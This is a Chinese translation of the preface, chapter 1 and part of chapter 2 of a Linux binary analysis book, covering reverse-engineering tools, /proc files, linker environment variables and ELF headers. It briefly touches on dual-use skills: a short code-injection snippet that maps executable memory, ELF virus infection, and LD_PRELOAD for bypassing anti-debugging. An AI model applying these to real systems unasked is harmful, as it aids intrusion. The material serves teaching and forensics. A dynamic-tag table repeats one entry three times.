# Linux 二进制分析学习手册（一）

> 原文：[`zh.annas-archive.org/md5/557450C26A7CBA64AA60AA031A39EC59`](https://zh.annas-archive.org/md5/557450C26A7CBA64AA60AA031A39EC59)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

软件工程是在微处理器上创建一个存在、生活和呼吸的发明的行为。我们称之为程序。逆向工程是发现程序的生存和呼吸方式的行为，而且它是我们如何使用反汇编器和逆向工具的组合来理解、解剖或修改该程序的行为，并依靠我们的黑客直觉来掌握我们正在逆向工程的目标程序。我们必须了解二进制格式、内存布局和给定处理器的指令集的复杂性。因此，我们成为了微处理器上程序生命的真正主人。逆向工程师擅长二进制掌握的艺术。这本书将为您提供成为 Linux 二进制黑客所需的正确课程、见解和任务。当有人称自己为逆向工程师时，他们将自己提升到了不仅仅是工程师的水平。一个真正的黑客不仅可以编写代码，还可以解剖代码，反汇编二进制文件和内存段，以修改软件程序的内部工作方式；这就是力量……

在专业和业余的层面上，我在计算机安全领域使用我的逆向工程技能，无论是漏洞分析、恶意软件分析、杀毒软件、rootkit 检测还是病毒设计。这本书的很多内容将集中在计算机安全方面。我们将分析内存转储、重建进程映像，并探索一些更神秘的二进制分析领域，包括 Linux 病毒感染和二进制取证。我们将解剖感染恶意软件的可执行文件，并感染运行中的进程。这本书旨在解释在 Linux 中进行逆向工程所需的组件，因此我们将深入学习 ELF（可执行和链接格式），这是 Linux 用于可执行文件、共享库、核心转储和目标文件的二进制格式。这本书最重要的方面之一是它深入洞察了 ELF 二进制格式的结构复杂性。ELF 的部分、段和动态链接概念是重要且令人兴奋的知识点。我们将探索黑客 ELF 二进制的深度，并看到这些技能如何应用于广泛的工作领域。

这本书的目标是教会你成为少数具有 Linux 二进制黑客基础的人之一，这将被揭示为一个广阔的主题，为您打开创新研究的大门，并让您处于 Linux 操作系统低级黑客的前沿。您将获得有关 Linux 二进制（和内存）修补、病毒工程/分析、内核取证和 ELF 二进制格式的宝贵知识。您还将对程序执行和动态链接有更多的见解，并对二进制保护和调试内部有更高的理解。

我是一名计算机安全研究人员、软件工程师和黑客。这本书只是对我所做的研究和作为结果产生的基础知识的有组织的观察和记录。

这些知识涵盖了广泛的信息范围，这些信息在互联网上找不到。这本书试图将许多相关主题汇集到一起，以便作为 Linux 二进制和内存黑客主题的入门手册和参考。它绝不是一个完整的参考，但包含了很多核心信息，可以帮助您入门。

# 这本书涵盖了什么

第一章*Linux 环境及其工具*，简要描述了本书中将使用的 Linux 环境及其工具。

第二章《ELF 二进制格式》帮助你了解 Linux 和大多数 Unix 操作系统中使用的 ELF 二进制格式的每个主要组件。

第三章《Linux 进程跟踪》教你如何使用 ptrace 系统调用来读取和写入进程内存并注入代码。

第四章《ELF 病毒技术- Linux/Unix 病毒》是你发现 Linux 病毒的过去、现在和未来，以及它们是如何设计的，以及围绕它们的所有令人惊奇的研究。

第五章《Linux 二进制保护》解释了 ELF 二进制保护的基本内部原理。

第六章《Linux ELF 二进制取证》是你学习如何解剖 ELF 对象以寻找病毒、后门和可疑的代码注入的地方。

第七章《进程内存取证》向你展示如何解剖进程地址空间，以寻找存储在内存中的恶意软件、后门和可疑的代码注入。

第八章《ECFS-扩展核心文件快照技术》是对 ECFS 的介绍，这是一个用于深度进程内存取证的新开源产品。

第九章《Linux /proc/kcore 分析》展示了如何通过对/proc/kcore 进行内存分析来检测 Linux 内核恶意软件。

# 你需要为这本书准备什么

这本书的先决条件如下：我们假设你具有对 Linux 命令行的工作知识、全面的 C 编程技能，以及对 x86 汇编语言的基本了解（这有帮助但不是必需的）。有一句话说，“如果你能读懂汇编语言，那么一切都是开源的。”

# 这本书适合谁

如果你是软件工程师或逆向工程师，并且想要了解更多关于 Linux 二进制分析的知识，这本书将为你提供在安全、取证和防病毒领域实施二进制分析解决方案所需的一切。这本书非常适合安全爱好者和系统级工程师。我们假设你具有一定的 C 编程语言和 Linux 命令行的经验。

# 惯例

在这本书中，你会发现一些文本样式，用以区分不同类型的信息。以下是一些这些样式的例子及其含义的解释。

文本中的代码单词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 用户名显示如下：“有七个节头，从偏移量`0x1118`开始。”

代码块设置如下：

```
uint64_t injection_code(void * vaddr)
{
        volatile void *mem;

        mem = evil_mmap(vaddr,
                        8192,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
                        -1, 0);

        __asm__ __volatile__("int3");
}
```

当我们希望引起你对代码块的特定部分的注意时，相关的行或项目将以粗体显示：

```
0xb755a990] changed to [0x8048376]
[+] Patched GOT with PLT stubs
Successfully rebuilt ELF object from memory
Output executable location: dumpme.out
[Quenya v0.1@ELFWorkshop]
quit
```

任何命令行输入或输出都以以下形式书写：

```
hacker@ELFWorkshop:~/
workshop/labs/exercise_9$ ./dumpme.out

```

### 注意

警告或重要提示会以这样的方式出现在一个框中。

### 提示

提示和技巧会出现在这样的形式。

# 读者反馈

我们非常欢迎读者的反馈。让我们知道你对这本书的看法——你喜欢或不喜欢什么。读者的反馈对我们很重要，因为它帮助我们开发出你真正能从中获益的标题。

要向我们发送一般反馈，只需通过电子邮件发送 `<feedback@packtpub.com>`，并在主题中提及书名。

如果您在某个专题上有专业知识，并且有兴趣撰写或为一本书做出贡献，请参阅我们的作者指南[www.packtpub.com/authors](http://www.packtpub.com/authors)。

# 客户支持

现在您是 Packt 图书的自豪所有者，我们有很多东西可以帮助您充分利用您的购买。

## 下载示例代码

您可以从[`www.packtpub.com`](http://www.packtpub.com)的帐户中下载您购买的所有 Packt Publishing 图书的示例代码文件。如果您在其他地方购买了这本书，您可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，以便文件直接通过电子邮件发送给您。

## 勘误表

尽管我们已经尽一切努力确保内容的准确性，但错误确实会发生。如果您在我们的书中发现错误，也许是文本或代码中的错误，我们将不胜感激，如果您能向我们报告。通过这样做，您可以帮助其他读者避免挫折，并帮助我们改进本书的后续版本。如果您发现任何勘误，请访问[`www.packtpub.com/submit-errata`](http://www.packtpub.com/submit-errata)，选择您的书，点击**勘误提交表格**链接，并输入您的勘误详情。一旦您的勘误被验证，您的提交将被接受，并且勘误将被上传到我们的网站或添加到该标题的**勘误**部分下的任何现有勘误列表中。

要查看先前提交的勘误表，请转到[`www.packtpub.com/books/content/support`](https://www.packtpub.com/books/content/support)并在搜索字段中输入书名。所需信息将出现在**勘误表**部分下。

## 盗版

互联网上侵犯版权材料的盗版是所有媒体的持续问题。在 Packt，我们非常重视版权和许可的保护。如果您在互联网上发现我们作品的任何非法副本，请立即向我们提供位置地址或网站名称，以便我们采取补救措施。

请通过`<copyright@packtpub.com>`与我们联系，并附上涉嫌盗版材料的链接。

我们感谢您在保护我们的作者和为您提供有价值内容的能力方面的帮助。

## 问题

如果您对本书的任何方面有问题，可以通过`<questions@packtpub.com>`与我们联系，我们将尽力解决问题。


# 第一章：Linux 环境及其工具

在本章中，我们将重点关注与本书主题相关的 Linux 环境。由于本书专注于 Linux 二进制文件分析，因此利用 Linux 提供的本地环境工具并且每个人都可以访问是有意义的。Linux 已经预装了无处不在的 binutils，但是它们也可以在[`www.gnu.org/software/binutils/`](http://www.gnu.org/software/binutils/)找到。它们包含了大量对二进制文件分析和黑客行为有用的工具。这不是另一本关于使用 IDA Pro 的书。IDA 是无疑是最好的通用软件，用于反向工程二进制文件，我鼓励根据需要使用它，但是在本书中我们不会使用它。相反，您将学会如何在几乎任何 Linux 系统上开始使用已经可访问的环境进行二进制文件的黑客行为。因此，您可以学会欣赏 Linux 作为一个真正的黑客环境，其中有许多免费工具可用。在整本书中，我们将演示各种工具的使用，并随着每一章的进展对如何使用它们进行回顾。然而，让本章作为 Linux 环境中这些工具和技巧的入门或参考。如果您已经非常熟悉 Linux 环境及其用于反汇编、调试和解析 ELF 文件的工具，那么您可以简单地跳过本章。

# Linux 工具

在本书中，我们将使用各种任何人都可以访问的免费工具。本节将为您简要介绍其中一些工具。

## GDB

GNU 调试器（GDB）不仅用于调试有错误的应用程序。它还可以用于了解程序的控制流，改变程序的控制流，并修改代码、寄存器和数据结构。这些任务对于一个正在利用软件漏洞或揭示复杂病毒内部运作的黑客来说是很常见的。GDB 适用于 ELF 二进制文件和 Linux 进程。它是 Linux 黑客的必备工具，并将在本书的各个示例中使用。

## 来自 GNU binutils 的 Objdump

对象转储（objdump）是一个快速反汇编代码的简单干净的解决方案。它非常适合反汇编简单且未被篡改的二进制文件，但是当尝试用它进行任何真正具有挑战性的逆向工程任务时，特别是针对敌对软件时，它很快就会显示出其局限性。它的主要弱点在于它依赖于`ELF`部分头，并且不执行控制流分析，这两个限制大大降低了它的鲁棒性。这导致无法正确地反汇编二进制文件中的代码，甚至在没有部分头的情况下根本无法打开二进制文件。然而，对于许多常规任务来说，它应该足够了，比如反汇编未加固、剥离或以任何方式混淆的常见二进制文件。它可以读取所有常见的`ELF`类型。以下是一些使用`objdump`的常见示例：

+   查看`ELF`文件中每个部分的所有数据/代码：

```
objdump -D <elf_object>

```

+   仅查看`ELF`文件中的程序代码：

```
objdump -d <elf_object>

```

+   查看所有符号：

```
objdump -tT <elf_object>

```

我们将在第二章中深入探讨`objdump`和其他工具，*ELF 二进制格式*。

## 来自 GNU binutils 的 Objcopy

对象复制（Objcopy）是一个非常强大的小工具，我们无法用简单的摘要来总结。我建议您阅读手册页以获取完整的描述。`Objcopy`可以用于分析和修改任何类型的`ELF`对象，尽管它的一些功能是特定于某些类型的`ELF`对象的。`Objcopy`通常用于修改或复制`ELF`二进制文件中的`ELF`部分。

要将`.data`节从一个`ELF`对象复制到一个文件，使用以下命令：

```
objcopy –only-section=.data <infile> <outfile>

```

`objcopy`工具将在本书的其余部分中根据需要进行演示。只需记住它的存在，它可以成为 Linux 二进制黑客非常有用的工具。

## strace

系统调用跟踪（strace）是一种基于`ptrace(2)`系统调用的工具，它利用循环中的`PTRACE_SYSCALL`请求来显示运行程序中系统调用（也称为`syscalls`）活动的信息，以及执行过程中捕获的信号。这个程序对于调试非常有用，或者只是收集运行时调用了哪些`syscalls`的信息。

这是用于跟踪基本程序的`strace`命令：

```
strace /bin/ls -o ls.out

```

用于附加到现有进程的`strace`命令如下：

```
strace -p <pid> -o daemon.out

```

初始输出将显示每个以文件描述符作为参数的系统调用的文件描述符号码，例如：

```
SYS_read(3, buf, sizeof(buf));

```

如果你想看到所有被读入文件描述符 3 的数据，你可以运行以下命令：

```
strace -e read=3 /bin/ls

```

您还可以使用`-e write=fd`来查看写入的数据。`strace`工具是一个非常好的小工具，您肯定会找到许多使用它的理由。

## ltrace

**库跟踪**（ltrace）是另一个非常有用的小工具，它与`strace`非常相似。它的工作方式类似，但它实际上解析了程序的共享库链接信息，并打印正在使用的库函数。

## 基本的 ltrace 命令

您可以使用`-S`标志在库函数调用之外看到系统调用。`ltrace`命令旨在提供更细粒度的信息，因为它解析可执行文件的动态段，并打印来自共享和静态库的实际符号/函数：

```
ltrace <program> -o program.out

```

## ftrace

**函数跟踪**（ftrace）是我设计的一个工具。它类似于`ltrace`，但它还显示了二进制本身内部函数的调用。我在 Linux 中找不到其他公开可用的工具可以做到这一点，所以我决定编写一个。这个工具可以在[`github.com/elfmaster/ftrace`](https://github.com/elfmaster/ftrace)找到。下一章将演示这个工具。

## readelf

`readelf`命令是解剖`ELF`二进制文件的最有用的工具之一。它提供了关于`ELF`的每一点数据，这些数据对于在逆向工程之前收集有关对象的信息是必要的。这个工具将在本书中经常使用，以收集有关符号、段、节、重定位条目、数据的动态链接等信息。`readelf`命令是`ELF`的瑞士军刀。我们将根据需要深入讨论它，在第二章*ELF 二进制格式*中，但以下是它最常用的一些标志：

+   要检索节头表：

```
readelf -S <object>

```

+   要检索程序头表：

```
readelf -l <object>

```

+   要检索符号表：

```
readelf -s <object>

```

+   要检索`ELF`文件头数据：

```
readelf -e <object>

```

+   要检索重定位条目：

```
readelf -r <object>

```

+   要检索动态段：

```
readelf -d <object>

```

## ERESI - ELF 逆向工程系统接口

ERESI 项目（[`www.eresi-project.org`](http://www.eresi-project.org)）包含许多工具，这些工具是 Linux 二进制黑客的梦想。不幸的是，其中许多工具没有得到更新，并且与 64 位 Linux 不完全兼容。但是，它们确实适用于各种架构，并且无疑是用于黑客`ELF`二进制的最具创新性的工具集。因为我个人对使用 ERESI 项目的工具并不是很熟悉，而且它们已经不再得到更新，所以我不会在本书中探讨它们的能力。但是，请注意，有两篇 Phrack 文章展示了 ERESI 工具的创新和强大功能：

+   Cerberus ELF 接口（[`www.phrack.org/archives/issues/61/8.txt`](http://www.phrack.org/archives/issues/61/8.txt)）

+   嵌入式 ELF 调试（[`www.phrack.org/archives/issues/63/9.txt`](http://www.phrack.org/archives/issues/63/9.txt)）

# 有用的设备和文件

Linux 有许多文件、设备和`/proc`条目对于热衷于黑客和逆向工程师非常有帮助。在本书中，我们将演示许多这些文件的用处。以下是本书中经常使用的一些文件的描述。

## /proc/<pid>/maps

`/proc/<pid>/maps`文件通过显示每个内存映射来包含进程映像的布局。这包括可执行文件、共享库、堆栈、堆、VDSO 等。这个文件对于能够快速解析进程地址空间的布局至关重要，并且在本书中多次使用。

## /proc/kcore

`/proc/kcore`是`proc`文件系统中的一个条目，它充当 Linux 内核的动态核心文件。也就是说，它是内存的原始转储，以`ELF`核心文件的形式呈现，可以被 GDB 用于调试和分析内核。我们将在第九章 *Linux /proc/kcore 分析*中深入探讨`/proc/kcore`。

## /boot/System.map

这个文件几乎在所有 Linux 发行版上都可以找到，对内核黑客非常有用。它包含整个内核的每个符号。

## /proc/kallsyms

`kallsyms`与`System.map`非常相似，只是它是一个`/proc`条目，这意味着它由内核维护并动态更新。因此，如果安装了任何新的 LKM，符号将会即时添加到`/proc/kallsyms`中。`/proc/kallsyms`至少包含内核中的大部分符号，如果在`CONFIG_KALLSYMS_ALL`内核配置中指定，将包含所有符号。

## /proc/iomem

`iomem`是一个有用的 proc 条目，它与`/proc/<pid>/maps`非常相似，但是适用于系统内存的所有部分。例如，如果你想知道内核的文本段在物理内存中的映射位置，你可以搜索`Kernel`字符串，你将看到`code/text`段、数据段和`bss`段：

```
 $ grep Kernel /proc/iomem
 01000000-016d9b27 : Kernel code
 016d9b28-01ceeebf : Kernel data
 01df0000-01f26fff : Kernel bss

```

## ECFS

扩展核心文件快照（ECFS）是一种专门为进程映像的高级取证分析而设计的特殊核心转储技术。该软件的代码可以在[`github.com/elfmaster/ecfs`](https://github.com/elfmaster/ecfs)找到。此外，第八章 *ECFS – 扩展核心文件快照技术*，专门解释了 ECFS 是什么以及如何使用它。对于那些对高级内存取证感兴趣的人，你会想要仔细关注这一点。

# 与链接器相关的环境变量

动态加载器/链接器和链接概念是程序链接和执行过程中不可避免的组成部分。在本书中，你将学到很多关于这些主题的知识。在 Linux 中，有很多方法可以改变动态链接器的行为，可以为二进制黑客提供很多帮助。随着我们在本书中的学习，你将开始理解链接、重定位和动态加载（程序解释器）的过程。以下是一些与链接器相关的属性，它们是有用的，并将在本书中使用。

## LD_PRELOAD 环境变量

`LD_PRELOAD`环境变量可以设置为指定在任何其他库之前应动态链接的库路径。这样做的效果是允许预加载库中的函数和符号覆盖之后链接的其他库中的函数和符号。这实质上允许您通过重定向共享库函数来执行运行时修补。正如我们将在后面的章节中看到的，这种技术可以用于绕过反调试代码和用户态 rootkit。

## LD_SHOW_AUXV 环境变量

这个环境变量告诉程序加载器在运行时显示程序的辅助向量。辅助向量是放置在程序堆栈上的信息（由内核的`ELF`加载例程放置），其中包含传递给动态链接器的有关程序的某些信息。我们将在第三章中更仔细地研究这一点，*Linux Process Tracing*，但这些信息可能对逆向和调试有用。例如，如果您想获取进程映像中 VDSO 页面的内存地址（也可以从`maps`文件中获取，如前所示），您必须寻找`AT_SYSINFO`。

以下是使用`LD_SHOW_AUXV`的辅助向量的示例：

```
$ LD_SHOW_AUXV=1 whoami
AT_SYSINFO: 0xb7779414
AT_SYSINFO_EHDR: 0xb7779000
AT_HWCAP: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2
AT_PAGESZ: 4096
AT_CLKTCK: 100
AT_PHDR:  0x8048034
AT_PHENT: 32
AT_PHNUM: 9
AT_BASE:  0xb777a000
AT_FLAGS: 0x0
AT_ENTRY: 0x8048eb8
AT_UID:  1000
AT_EUID: 1000
AT_GID:  1000
AT_EGID: 1000
AT_SECURE: 0
AT_RANDOM: 0xbfb4ca2b
AT_EXECFN: /usr/bin/whoami
AT_PLATFORM: i686
elfmaster

```

辅助向量将在第二章中更深入地介绍，*The ELF Binary Format*。

## 链接器脚本

链接器脚本对我们来说是一个关注点，因为它们由链接器解释，并帮助塑造程序的布局，涉及到节、内存和符号。默认的链接器脚本可以通过`ld -verbose`查看。

`ld`链接程序有一个完整的语言，当它接受输入文件（如可重定位目标文件、共享库和头文件）时，它会解释这种语言，并使用这种语言来确定输出文件，如可执行程序，将如何组织。例如，如果输出是一个`ELF`可执行文件，链接器脚本将帮助确定布局和哪些段中存在哪些节。另一个例子是：`.bss`节总是在数据段的末尾；这是由链接器脚本确定的。您可能想知道这对我们来说有什么意义。嗯！首先，重要的是在编译时对链接过程有一些了解。`gcc`依赖于链接器和其他程序来执行这项任务，在某些情况下，能够控制可执行文件的布局是很重要的。`ld`命令语言是一种非常深入的语言，超出了本书的范围，但值得一看。在逆向工程可执行文件时，要记住，常见的段地址有时可能会被修改，布局的其他部分也可能会被修改。这表明涉及自定义链接器脚本。可以使用`gcc`的`-T`标志指定链接器脚本。我们将在第五章中看一个使用链接器脚本的具体例子，*Linux Binary Protection*。

# 总结

我们刚刚简要介绍了 Linux 环境的一些基本方面和每章演示中最常用的工具。二进制分析在很大程度上是关于了解可用的工具和资源以及它们如何相互配合。我们只是简要介绍了这些工具，但随着我们在接下来的章节中探索 Linux 二进制黑客的广阔世界，我们将有机会强调每个工具的能力。在下一章中，我们将深入探讨 ELF 二进制格式的内部，并涵盖许多有趣的主题，如动态链接、重定位、符号、节等。


# 第二章：ELF 二进制格式

要逆向工程 Linux 二进制文件，您必须了解二进制格式本身。 ELF 已成为 Unix 和类 Unix 操作系统的标准二进制格式。在 Linux、BSD 变体和其他操作系统中，ELF 格式用于可执行文件、共享库、目标文件、核心转储文件，甚至内核引导映像。这使得学习 ELF 对于那些想要更好地理解逆向工程、二进制黑客和程序执行的人来说非常重要。诸如 ELF 之类的二进制格式通常不是一个快速的学习过程，学习 ELF 需要一定程度的应用，随着学习的进行，需要实际的动手经验才能达到熟练程度。ELF 格式复杂而枯燥，但在逆向工程和编程任务中应用您不断发展的对它的知识时，可以带来一些乐趣。ELF 实际上是计算机科学的一个令人难以置信的组成部分，包括程序加载、动态链接、符号表查找以及许多其他紧密协调的组件。

我认为这一章也许是整本书中最重要的，因为它将使读者对程序实际在磁盘上是如何映射并加载到内存中有更深入的了解。程序执行的内部工作是复杂的，理解它对于有抱负的二进制黑客、逆向工程师或低级程序员来说是宝贵的知识。在 Linux 中，程序执行意味着 ELF 二进制格式。

我的学习 ELF 的方法是通过调查 ELF 规范，就像任何 Linux 逆向工程师应该做的那样，然后以创造性的方式应用我们所学到的每个方面。在本书中，您将了解 ELF 的许多方面，并看到对病毒、进程内存取证、二进制保护、rootkit 等知识的重要性。

在本章中，您将涵盖以下 ELF 主题：

+   ELF 文件类型

+   程序头

+   段头

+   符号

+   重定位

+   动态链接

+   编写 ELF 解析器

# ELF 文件类型

ELF 文件可以标记为以下类型之一：

+   `ET_NONE`：这是一个未知类型。它表示文件类型未知，或者尚未定义。

+   `ET_REL`：这是一个可重定位文件。ELF 类型可重定位意味着文件被标记为可重定位的代码片段，有时也称为目标文件。可重定位目标文件通常是尚未链接到可执行文件中的**位置无关代码**（**PIC**）的片段。您经常会在编译代码库中看到`.o`文件。这些文件保存了适用于创建可执行文件的代码和数据。

+   `ET_EXEC`：这是一个可执行文件。ELF 类型可执行意味着文件被标记为可执行文件。这些类型的文件也被称为程序，并且是进程开始运行的入口点。

+   `ET_DYN`：这是一个共享对象。ELF 类型动态意味着文件被标记为动态可链接的目标文件，也称为共享库。这些共享库在运行时加载和链接到程序的进程映像中。

+   `ET_CORE`：这是一个 ELF 类型的核心文件。核心文件是在程序崩溃时或进程传递了 SIGSEGV 信号（段错误）时，对完整进程映像的转储。GDB 可以读取这些文件，并帮助调试以确定是什么导致程序崩溃。

如果我们使用命令`readelf -h`查看 ELF 文件，我们可以查看初始 ELF 文件头。 ELF 文件头从 ELF 文件的偏移 0 开始，并用作文件的其余部分的映射。主要是，此标头标记了 ELF 类型，体系结构和执行开始的入口点地址，并提供了到其他类型的 ELF 标头（部分标头和程序标头）的偏移量，这将在后面深入解释。一旦我们解释了部分标头和程序标头的含义，就会更多地了解文件标头。查看 Linux 中的 ELF(5) man 页面可以显示 ELF 标头结构：

```
#define EI_NIDENT 16
           typedef struct {
               unsigned char e_ident[EI_NIDENT];
               uint16_t      e_type;
               uint16_t      e_machine;
               uint32_t      e_version;
               ElfN_Addr     e_entry;
               ElfN_Off      e_phoff;
               ElfN_Off      e_shoff;
               uint32_t      e_flags;
               uint16_t      e_ehsize;
               uint16_t      e_phentsize;
               uint16_t      e_phnum;
               uint16_t      e_shentsize;
               uint16_t      e_shnum;
               uint16_t      e_shstrndx;
           } ElfN_Ehdr;
```

在本章后面，我们将看到如何利用此结构中的字段来使用简单的 C 程序映射出 ELF 文件。首先，我们将继续查看其他存在的 ELF 标头类型。

# ELF 程序头

ELF 程序头描述了二进制文件中的段，并且对于程序加载是必要的。在加载时，内核通过段来理解并描述可执行文件在磁盘上的内存布局以及它应该如何转换到内存中。程序头表可以通过引用初始 ELF 标头成员`e_phoff`（程序头表偏移）中找到的偏移量来访问，如显示`1.7`中的`ElfN_Ehdr`结构所示。

这里有五种常见的程序头类型，我们将在这里讨论。程序头描述可执行文件（包括共享库）的段以及它是什么类型的段（即，它为何保留了什么类型的数据或代码）。首先，让我们看看 32 位 ELF 可执行文件的程序头表中组成程序头条目的`Elf32_Phdr`结构。

### 注意

我们有时将程序头称为 Phdrs 在本书的其余部分。

这是`Elf32_Phdr`结构：

```
typedef struct {
    uint32_t   p_type;   (segment type)
    Elf32_Off  p_offset; (segment offset)
    Elf32_Addr p_vaddr;   (segment virtual address)
    Elf32_Addr p_paddr;    (segment physical address)
    uint32_t   p_filesz;   (size of segment in the file)
    uint32_t   p_memsz; (size of segment in memory)
    uint32_t   p_flags; (segment flags, I.E execute|read|read)
    uint32_t   p_align;  (segment alignment in memory)
  } Elf32_Phdr;
```

## PT_LOAD

可执行文件将始终至少有一个`PT_LOAD`类型段。这种类型的程序头描述了一个可加载段，这意味着该段将被加载或映射到内存中。

例如，具有动态链接的 ELF 可执行文件通常包含以下两个可加载段（类型为`PT_LOAD`）：

+   程序代码的文本段

+   以及全局变量和动态链接信息的数据段

前两个段将被映射到内存中，并且将根据`p_align`中存储的值在内存中对齐。我建议在 Linux 中阅读 ELF man 页面，以了解 Phdr 结构中的所有成员，因为它们描述了文件中的段以及内存中的布局。

程序头主要用于描述程序在执行和内存中的布局。我们将在本章后面使用 Phdrs 来演示它们是什么以及如何在逆向工程软件中使用它们。

### 注意

文本段（也称为代码段）通常将段权限设置为`PF_X` | `PF_R`（`读+执行`）。

数据段通常将段权限设置为`PF_W` | `PF_R`（`读+写`）。

受多态病毒感染的文件可能以某种方式更改了这些权限，例如通过将`PF_W`标志添加到程序头的段标志（`p_flags`）中，从而修改文本段为可写。

## PT_DYNAMIC - 动态段的 Phdr

动态段是特定于动态链接的可执行文件，包含动态链接器所需的信息。此段包含标记值和指针，包括但不限于以下内容：

+   要在运行时链接的共享库列表

+   **全局偏移表**（**GOT**）的地址/位置在*ELF 动态链接*部分讨论

+   有关重定位条目的信息

以下是标签名称的完整列表：

| 标签名称 | 描述 |
| --- | --- |
| `DT_HASH` | 符号哈希表的地址 |
| `DT_STRTAB` | 字符串表的地址 |
| `DT_SYMTAB` | 符号表的地址 |
| `DT_RELA` | Rela 重定位表的地址 |
| `DT_RELASZ` | Rela 表的字节大小 |
| `DT_RELAENT` | Rela 表条目的字节大小 |
| `DT_STRSZ` | 字符串表的字节大小 |
| `DT_STRSZ` | 字符串表的字节大小 |
| `DT_STRSZ` | 字符串表的字节大小 |
| `DT_SYMENT` | 符号表条目的字节大小 |
| `DT_INIT` | 初始化函数的地址 |
| `DT_FINI` | 终止函数的地址 |
| `DT_SONAME` | 共享对象名称的字符串表偏移 |
| `DT_RPATH` | 库搜索路径的字符串表偏移 |
| `DT_SYMBOLIC` | 提醒链接器在可执行文件之前搜索此共享对象的符号 |
| `DT_REL` | Rel 重定位表的地址 |
| `DT_RELSZ` | Rel 表的字节大小 |
| `DT_RELENT` | Rel 表条目的字节大小 |
| `DT_PLTREL` | PLT 引用的重定位类型（Rela 或 Rel） |
| `DT_DEBUG` | 调试的未定义用途 |
| `DT_TEXTREL` | 缺少此项表示不可写段不应用任何重定位 |
| `DT_JMPREL` | 仅用于 PLT 的重定位条目的地址 |
| `DT_BIND_NOW` | 指示动态链接器在将控制转移给可执行文件之前处理所有重定位 |
| `DT_RUNPATH` | 库搜索路径的字符串表偏移 |

动态段包含一系列结构，其中包含相关的动态链接信息。`d_tag`成员控制`d_un`的解释。

32 位 ELF 动态结构：

```
typedef struct {
Elf32_Sword    d_tag;
    union {
Elf32_Word d_val;
Elf32_Addr d_ptr;
    } d_un;
} Elf32_Dyn;
extern Elf32_Dyn _DYNAMIC[];
```

我们将在本章后面更多地探讨**动态链接**。

## PT_NOTE

类型为`PT_NOTE`的段可能包含对特定供应商或系统相关的辅助信息。以下是来自正式 ELF 规范的`PT_NOTE`的定义：

有时供应商或系统构建者需要使用特殊信息标记对象文件，其他程序将检查符合性、兼容性等。`SHT_NOTE`类型的节和`PT_NOTE`类型的程序头元素可用于此目的。节和程序头元素中的注释信息包含任意数量的条目，每个条目都是目标处理器格式的 4 字节字数组。下面的标签有助于解释注释信息的组织，但它们不是规范的一部分。

一个值得注意的地方：由于这个段仅用于 OS 规范信息，实际上对于可执行文件的运行并不是必需的（因为系统无论如何都会假定可执行文件是本地的），这个段成为病毒感染的有趣地方，尽管由于大小限制，这并不一定是最实际的方法。关于 NOTE 段感染的一些信息可以在[`vxheavens.com/lib/vhe06.html`](http://vxheavens.com/lib/vhe06.html)找到。

## PT_INTERP

这个小段只包含一个指向空终止字符串的位置和大小，描述了程序解释器的位置；例如，`/lib/linux-ld.so.2`通常是动态链接器的位置，也是程序解释器的位置。

## PT_PHDR

此段包含程序头表本身的位置和大小。Phdr 表包含文件（以及内存映像中）描述段的所有 Phdr。

请参阅 ELF(5)手册页面或 ELF 规范文件，以查看所有可能的 Phdr 类型。我们已经涵盖了最常见的那些对程序执行至关重要的，或者在我们的逆向工程努力中最常见的那些。

我们可以使用`readelf -l <filename>`命令查看文件的 Phdr 表：

```
Elf file type is EXEC (Executable file)
Entry point 0x8049a30
There are 9 program headers, starting at offset 52
Program Headers:
  Type          Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR          0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP        0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD          0x000000 0x08048000 0x08048000 0x1622c 0x1622c R E 0x1000
  LOAD          0x016ef8 0x0805fef8 0x0805fef8 0x003c8 0x00fe8 RW  0x1000
  DYNAMIC       0x016f0c 0x0805ff0c 0x0805ff0c 0x000e0 0x000e0 RW  0x4
  NOTE          0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME  0x016104 0x0805e104 0x0805e104 0x0002c 0x0002c R   0x4
  GNU_STACK     0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO     0x016ef8 0x0805fef8 0x0805fef8 0x00108 0x00108 R   0x1
```

我们可以看到可执行文件的入口点，以及我们刚刚讨论过的一些不同的段类型。注意两个第一个`PT_LOAD`段的权限标志和对齐标志右侧的偏移量。

文本段是`READ+EXECUTE`，数据段是`READ+WRITE`，两个段的对齐方式都是`0x1000`或 4,096，这是 32 位可执行文件的页面大小，用于程序加载时的对齐。

# ELF 节头

现在我们已经看过程序头是什么，是时候看看节头了。我在这里真的想指出两者之间的区别；我经常听到人们将节称为段，将段称为节等等。节不是段。段对于程序执行是必要的，在每个段内，都有被分成节的代码或数据。节头表存在是为了引用这些节的位置和大小，主要用于链接和调试。节头对于程序执行并不是必要的，一个程序没有节头表也可以正常执行。这是因为节头表并不描述程序的内存布局。这是程序头表的责任。节头实际上只是程序头的补充。`readelf -l`命令将显示哪些节映射到哪些段，这有助于可视化节和段之间的关系。

如果节头被剥离（在二进制文件中缺失），这并不意味着节不存在；这只是意味着它们不能被节头引用，调试器和反汇编程序的信息就会更少。

每个节都包含某种类型的代码或数据。数据可以是程序数据，如全局变量，或者对于链接器而言是必要的动态链接信息。现在，正如之前提到的，每个 ELF 对象都有节，但并非所有 ELF 对象都有**节头**，主要是当有人故意删除了节头表时，这不是默认情况。

通常，这是因为可执行文件已被篡改（例如，节头已被剥离，使得调试更加困难）。GNU 的所有 binutils，如`objcopy`，`objdump`，以及`gdb`等其他工具都依赖于节头来定位存储在包含符号数据的节中的符号信息。没有节头，诸如`gdb`和`objdump`之类的工具几乎是无用的。

